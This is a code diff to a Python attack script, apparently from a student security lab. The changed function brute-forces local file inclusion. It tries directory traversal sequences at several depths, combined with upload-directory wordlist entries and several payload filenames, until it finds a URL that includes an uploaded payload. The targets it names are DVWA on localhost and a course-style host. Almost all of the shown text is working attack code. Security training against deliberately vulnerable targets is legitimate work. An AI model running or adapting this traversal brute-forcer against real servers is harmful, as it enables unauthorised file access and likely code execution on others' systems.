@@ -22,7 +22,7 @@ def show_passwd(target_url, COOKIE):
     return False
 
 
-def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
+def brute_force_lfi(lfi_url_base, payload_filenames, session, COOKIE):
 
     with open("upload_dir_wordlist.txt", "r") as f:
         payload_relatives = [
@@ -35,23 +35,24 @@ def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
     for payload_relative in payload_relatives:
         for combi in lfi_combis:
             for depth in range(1, 6):
-                traversal = combi * depth
-                test_url = (
-                    f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
-                )
-                # print(f"[*] Trying LFI URL: {test_url}")
-                try:
-                    response = session.get(test_url, cookies=COOKIE)
-                    if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
-                        if "File not found." not in response.text:
-                            print(f"[+] Successfully included payload: {test_url}")
-                            return test_url
-                    elif "http://127.0.0.1/DVWA/" in lfi_url_base:
-                        if not response.text.startswith("<!DOCTYPE html>"):
-                            print(f"[+] Successfully included payload: {test_url}")
-                            return test_url
-                except Exception as e:
-                    print(f"[-] Error testing {test_url}: {str(e)}")
+                for payload_filename in payload_filenames:
+                    traversal = combi * depth
+                    test_url = (
+                        f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
+                    )
+                    # print(f"[*] Trying LFI URL: {test_url}")
+                    try:
+                        response = session.get(test_url, cookies=COOKIE)
+                        if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
+                            if "File not found." not in response.text:
+                                print(f"[+] Successfully included payload: {test_url}")
+                                return test_url
+                        elif "http://127.0.0.1/DVWA/" in lfi_url_base:
+                            if not response.text.startswith("<!DOCTYPE html>"):
+                                print(f"[+] Successfully included payload: {test_url}")
+                                return test_url
+                    except Exception as e:
+                        print(f"[-] Error testing {test_url}: {str(e)}")
 
     return None
 
